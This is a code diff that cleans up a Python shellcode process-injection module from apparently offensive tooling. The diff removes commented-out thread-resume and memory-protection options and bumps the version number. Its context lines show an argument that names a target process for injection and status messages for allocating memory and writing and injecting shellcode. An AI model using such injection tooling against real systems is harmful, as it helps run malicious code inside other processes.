@@ -1,14 +1,12 @@
 ########################################################
 ### NtInjection Module
-### Status: migrated to 082
+### Status: cleaned, 083
 ### 
 ########################################################
 
 import os
-#import ctypes
 from utils.windef import *
 from utils.winconst import *
-
 from utils.helper import nstate
 from utils.helper import CheckFile, GetFileInfo
 
@@ -20,21 +18,16 @@ def register_arguments(parser):
             parser.add_argument('-p', '--process', help='Processname to inject the shellcode')
 
             grp = parser.add_argument_group('additional')
-            # grp.add_argument('-r', '--resume-thread', action='store_true', help='Start thread suspended and resume after speciefied time')
             grp.add_argument('-s', '--start-process', action='store_true', help='If not active, start the process before injection')
-            # grp.add_argument('-v', '--virtual-protect', action='store_true', help='Deny access on memory for a specified time')
 
 class module:
-    #from ctypes import windll
-    #from ctypes import wintypes
     from urllib import request
     from time import sleep
     import wmi
     import threading
 
     Author = 'psycore8'
-    #Description = 'native inject shellcode to process'
-    Version = '0.0.4'
+    Version = '0.0.5'
     DisplayName = 'NATIVE-INJECTION'
     delay = 5
     data_size = 0
@@ -49,8 +42,7 @@ class module:
         self.input_file = input
         self.process_start = start_process
         self.target_process = process
-        # self.resume_thread = resume_thread
-        # self.virtual_protect = virtual_protect
+
 
     def msg(self, message_type, ErrorExit=False):
         messages = {
@@ -68,12 +60,7 @@ class module:
             'inj.handle'     : f'{nstate.s_ok} Opened a Handle to the process',
             'inj.alloc'      : f'{nstate.s_ok} Allocated Memory in the process',
             'inj.write'      : f'{nstate.s_ok} Wrote The shellcode to memory',
-            #'inj.nacc'       : f'{nstate.s_note} VirtualProtectEx: PAGE_NO_ACCESS',
-            #'inj.susp'       : f'{nstate.s_note} CreateRemoteThread: START_SUSPENDED',
             'inj.inj_ok'     : f'{nstate.s_ok} Injected the shellcode into the process',
-           # 'inj.rwe'        : f'{nstate.s_note} VirtualProtectEx: PAGE_READWRITE_EXECUTE',
-            #'inj.rest'       : f'{nstate.s_note} ResumeThread',
-            #'inj.resume'     : f'{nstate.s_ok} Process resumed'
 
         }
         print(messages.get(message_type, f'{message_type} - this message type is unknown'))
@@ -147,19 +134,6 @@ class module:
 
         if resume == NT_SUCCESS:
             print('ok')
-
-        # if self.virtual_protect:
-        #     self.msg('inj.rwe')
-        #     VirtualProtectEx(phandle, None, 0, 0x40, None)
-
-        # if self.resume_thread or self.virtual_protect:
-        #     self.sleep(self.delay)
-        #     self.msg('inj.rest')
-        #     resume = ResumeThread(Injection)
-        #     if resume:
-        #         self.msg('inj.resume')
-        #WaitForSingleObject(th, 300000)
-
         CloseHandle(phandle)
 
     def proc_inject():
